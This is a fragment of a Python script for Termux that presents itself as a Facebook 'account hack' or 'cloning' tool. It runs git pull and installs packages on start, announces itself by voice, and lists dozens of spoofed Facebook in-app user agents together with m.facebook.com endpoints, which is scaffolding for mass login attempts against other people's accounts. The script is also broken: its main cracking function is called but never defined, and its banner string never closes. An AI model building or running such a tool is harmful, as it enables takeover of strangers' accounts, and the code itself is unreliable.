import os
print("\033[1;92m [•] Tanvir (ROBOT) SYSTEM INSTALL. . . . \033[1;30m")
os.system("pkg install espeak")
print("\033[1;92m   [•] ROBOT INSTALL COMPLETE \033[1;30m")
os.system('espeak -a 300 "Robot install complete"')
print("\033[1;92m   [•] UPDATE CHECKING \033[1;30m")
os.system('espeak -a 300 "WAITING FOR UPDATE"')
os.system("git pull")
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import os
import random
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import mechanize
from requests.exceptions import ConnectionError
import string
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')
    os.system('git pull')
    os.system('pkg install curl')
import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as ahmadAXI
from datetime import datetime
from bs4 import BeautifulSoup

ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
R = '\033[31;1m'
G = '\033[32;1m'
Y = '\033[33;1m'
B = '\033[34;1m'
M = '\033[35;1m'
C = '\033[36;1m'
LR = '\033[91;1m'
LG = '\033[92;1m'
LY = '\033[93;1m'
LB = '\033[94;1m'
LM = '\033[95;1m'
LC = '\033[96;1m'
dc = random.choice([R,G,Y,B,M,C,LR,LG,LY,LB,LM])
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
oks = []
cps = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

ugen=[]
ugen = ["Mozilla/5.0 (Linux; Android 7.1.2; LM-X210 Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (Linux; Android 13; SM-G781B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/346.0.0.8.76;]",]
ugen = ["Mozilla/5.0 (Linux; Android 13; SM-X200 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Safari/537.36 GNews Android/2022120648",]
ugen = ["Mozilla/5.0 (Linux; Android 9; ANE-LX1; HMSCore 6.9.6.301; GMSCore 23.09.14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HugenweiBrowser/13.0.3.301 Mobile Safari/537.36",]
ugen = ["Mozilla/5.0 (Linux; Android 13; CPH2195 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (Linux; Android 10; A7 Pro Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",]
ugen = ["Mozilla/5.0 (Linux; Android 12; CPH2009 Build/RKQ1.211103.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",]
ugen = ["Mozilla/5.0 (Linux; Android 11; SM-A405FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (Linux; Android 8.0.0; BAH2-W19 Build/HugenWEIBAH2-W19) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Safari/537.36 GNews Android/2022120648",]
ugen = ["Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (Linux; Android 7.0; SM-T815 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Safari/537.36 GNews Android/2022120648",]
ugen = ["Mozilla/5.0 (Linux; Android 13; RMX3521 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",]
ugen = ["Mozilla/5.0 (Linux; Android 13; SM-A336B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 GNews Android/2022095808",]
ugen = ["Mozilla/5.0 (Linux; Android 11; M2101K9G Build/RKQ1.201112.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (iPhone; CPU iPhone OS 12_5_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 (4863324784)",]
ugen = ["Mozilla/5.0 (Linux; Android 9; G8441 Build/47.2.A.11.228) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",]
ugen = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 [ip:2.47.8.31]",]
ugen = ["Mozilla/5.0 (Linux; Android 10; CDY-NX9A; HMSCore 6.9.6.302) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HugenweiBrowser/13.0.4.302 Mobile Safari/537.36",]
ugen = ["Mozilla/5.0 (Linux; Android 10; SM-A015M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (Linux; Android 9; SM-J600GT Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]",]
ugen = ["Mozilla/5.0 (Linux; Android 8.1.0; HTC U12 life Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022120648",]
ugen = ["Mozilla/5.0 (Linux; Android 11; RMX2063 Build/RKQ1.201112.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36",]
ugen = ["Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [ip:37.163.127.55]",]
ugen = ["Mozilla/5.0 (Linux; Android 10; SM-G965F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",]
ugen = ["Mozilla/5.0 (Linux; Android 11; M2006C3LVG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.18 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (Linux; Android 9; INE-LX1 Build/HugenWEIINE-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]",]
ugen = ["Mozilla/5.0 (Linux; Android 13; SM-G991B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.58 Mobile Safari/537.36",]
ugen = ["Mozilla/5.0 (Linux; Android 8.1.0; SM-G610M Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]",]
ugen = ["Mozilla/5.0 (Linux; Android 12; 220333QNY Build/SKQ1.211103.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.75 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]PolaroidMusic/1229 CFNetwork/1404.0.5 Darwin/22.3.0",]
ugen = ["Mozilla/5.0 (Linux; Android 9; SM-T515 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",]
ugen = ["Mozilla/5.0 (Linux; Android 10; M2006C3LVG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36 (Ecosia android@101.0.4951.41)",]
ugen = ["Mozilla/5.0 (Linux; Android 13; CPH2145 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",]
ugen = ["Mozilla/5.0 (Linux; Android 10; JNY-LX1; HMSCore 6.9.6.302) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HugenweiBrowser/13.0.4.302 Mobile Safari/537.36",]
ugen = ["Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.69 Safari/537.36 [ip:151.67.189.250]",]
ugen = ["Mozilla/5.0 (Linux; Android 13; M2101K9G Build/TKQ1.220829.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022118446",]
ugen = ["Mozilla/5.0 (Linux; Android 10; KingPad_SA8_EEA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",]
ugen = ["Mozilla/5.0 (Linux; Android 12; 220333QNY Build/SKQ1.211103.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 GNews Android/2022118446",]
ugen = ["Mozilla/5.0 (Linux; Android 13; LE2123 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.29 Mobile Safari/537.36 GNews Android/2022120648",]
ugen = ["Mozilla/5.0 (Linux; Android 7.0; FRD-L09 Build/HugenWEIFRD-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 Instagram 274.0.0.26.90 Android (24/7.0; 480dpi; 1080x1794; HugenWEI/HONOR; FRD-L09; HWFRD; hi3650; en_GB; 456141779)",]
ugen = ["Mozilla/5.0 (Linux; Android 11; RMX3231 Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",]
ugen = ["Mozilla/5.0 (Linux; Android 10; POCOPHONE F1 Build/QKQ1.190828.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (Linux; Android 11; motorola edge Build/RPDS31.Q4U-39-26-14-10-1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]",]
ugen = ["Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16G201 [FBAN/FBIOS;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.4.8;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5]",]
ugen = ["Mozilla/5.0 (Linux; Android 10; CLT-L29 Build/HugenWEICLT-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/387.0.0.24.102;]",]
ugen = ["Mozilla/5.0 (Linux; Android 10; SM-N960F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]",]
ugen = ["Mozilla/5.0 (Linux; Android 12; CPH2089) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.63 Mobile Safari/537.36 ABB/3.2.6",]
ugen = ["Mozilla/5.0 (Linux; Android 7.0; SM-T819 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (Linux; Android 11; SM-G973F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Herring/100.1.1310.11",]
ugen = ["Mozilla/5.0 (Linux; Android 9; COR-L29 Build/HugenWEICOR-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (Linux; Android 11; SM-G780F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/371.0.0.24.109;]",]
ugen = ["Mozilla/5.0 (Linux; Android 10; Redmi Note 8T Build/QKQ1.200114.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]",]
ugen = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBDV/iPhone13,3;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5]",]
ugen = ["Mozilla/5.0 (Linux; Android 13; SM-G7810 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (Linux; Android 11; 220333QNY Build/RKQ1.211001.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.75 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]radio.se 5.6.18 (iPhone; iPhone OS 16.2; sv_FI)",]
ugen = ["Mozilla/5.0 (Linux; Android 10; Lenovo TB-X505F Build/QKQ1.191224.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (Linux; Android 13; SM-M526B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (Linux; Android 13; SM-A326B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022118446",]
ugen = ["Mozilla/5.0 (Linux; Android 9; STF-L09 Build/HugenWEISTF-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (Linux; Android 8.0.0; XT1635-02 Build/OPNS27.76-12-22-9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 [ip:193.207.129.16]",]
ugen = ["Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HugenWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/605.1.15 GNews iOS/5.71.101",]
ugen = ["Mozilla/5.0 (Linux; Android 10; Redmi 8 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.75 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (Linux; Android 9; SM-G611MT Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile DuckDuckGo/5 Safari/537.36 [ip:92.88.170.234]",]
ugen = ["Mozilla/5.0 (Linux; Android 8.1.0; HTC U12 life Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44 [ip:188.6.110.242]",]
ugen = ["Mozilla/5.0 (Linux; Android 9; DUK-L09 Build/HugenWEIDUK-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.75 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (Linux; Android 13; SM-A525F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/376.0.0.12.108;]",]
ugen = ["Mozilla/5.0 (Linux; Android 13; RMX3301 Build/SKQ1.220617.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (Linux; Android 11; SM-N981B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (Linux; Android 7.0; SM-G928F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (Linux; Android 12; SM-S908B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (Linux; Android 11; 2201117TG Build/RKQ1.211001.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (Linux; Android 11; SM-A225F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (Linux; Android 11; R2022 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (Linux; Android 10; SM-T590 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]",]
ugen = ["Mozilla/5.0 (Linux; Android 8.0.0; WAS-LX1A Build/HugenWEIWAS-LX1A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Dalvik/2.1.0 (Linux; U; Android 13; 22071219CG Build/TP1A.220624.014)",]
ugen = ["Mozilla/5.0 (Linux; Android 10; M2007J3SY Build/QKQ1.200419.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (Linux; Android 12; LM-K520 Build/SKQ1.211103.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (Linux; Android 13; SM-A035G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 [ip:77.205.22.172]",]
ugen = ["Mozilla/5.0 (Linux; Android 11; moto g(9) play Build/RPXS31.Q2-58-17-7-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36",]
ugen = ["Mozilla/5.0 (Linux; Android 10; Armor 9E Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]",]
ugen = ["Mozilla/5.0 (Linux; Android 13; SM-M127F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.75 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 [ip:151.82.196.155]",]
ugen = ["Mozilla/5.0 (Linux; Android 9; LLD-L31 Build/HONORLLD-L31) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022118458",]
ugen = ["Mozilla/5.0 (Linux; Android 11; SM-G525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",]
ugen = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 [ip:37.103.241.14]",]
ugen = ["Mozilla/5.0 (Linux; Android 13; SM-A526B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.75 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (Linux; Android 11; SM-A305GT Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]",]
ugen = ["Mozilla/5.0 (Linux; Android 13; SM-G985F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]
ugen = ["Mozilla/5.0 (Linux; Android 10; Redmi Note 8T Build/QKQ1.200114.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/391.1.0.37.104;]",]
ugen = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 [ip:151.18.34.64]",]
ugen = ["Mozilla/5.0 (Linux; Android 9; SM-A405FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/395.0.0.10.75;]",]
 
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

def LEGENDBOY():
    os.system('clear')
    print(logo)
    os.system('espeak -a 300 "Walcome To TanVir Hossen World"')
    os.system('speak -a 300 "Facebook ACCOUNT Hack. Tools"')
    os.system('speak -a 300 "I Fuck Your Attitude"')
    print("")
    print('\033[38;5;46m   [01] GAME IDZ CLONING')
    print('\033[38;5;46m   [02] CONTACT ME FACEBOOK')
    print('\033[38;5;46m   [03] PYTHON CLASS CHANNEL')
    NAHID = input('\n\x1b[1;32m   CHOOSE : ')
    if NAHID == '1':
    	os.system('espeak -a 300 "random cloning start"')
    os.system('xdg-open https://www.facebook.com/profile.php?id=100080269757989&mibextid=ZbWKwL')
    time.sleep(5)
    nahid_afridy()
    if NAHID == '2':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100080269757989&mibextid=ZbWKwL')
        nahid_afridy()
    if NAHID == '3':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100080269757989&mibextid=ZbWKwL')
        nahid_afridy()
    if NAHID == '0': 
        os.system('exit')
        return None

logo = ("""
\033[1;93m _______   _______ ___________     ___________  _____ 
\033[1;92m/  __ \ \ / / ___ \  ___| ___ \   |___  /  _  ||  _  |
\033[1;93m| /  \/\ V /| |_/ / |__ | |_/ /_____ / / \ V /  \ V / 
\033[1;92m| |     \ / | ___ \  __||    /______/ /  / _ \  / _ \ 
\033[1;93m| \__/\ | | | |_/ / |___| |\ \    ./ /  | |_| || |_| |
\033[1;92m \____/ \_/ \____/\____/\_| \_|   \_/   \_____/\_____/                                                                                                        
	       \033[1;94m["WELCOME TO OUR world "]                                                       
\033[1;31m[\033[1;32m+\033[1;31m]\033[1;93m═════════════════════════════════════════════════\033[1;31m[\033[1;32m+\033[1;31m]
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m CREATED BY\33[0;m   : \033[1;96mTanvir Hossen 
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m FACEBOK      : \033[1;34mTanvir Hossen 
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m GITHUB       : \033[1;35mHares-788-Cyber      
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TOOL STATUS  : \033[1;36mRendom   
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TEAM         : \033[1;35mCyber-788                 
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TOOL VIRSION : \033[1;36m1.0                   
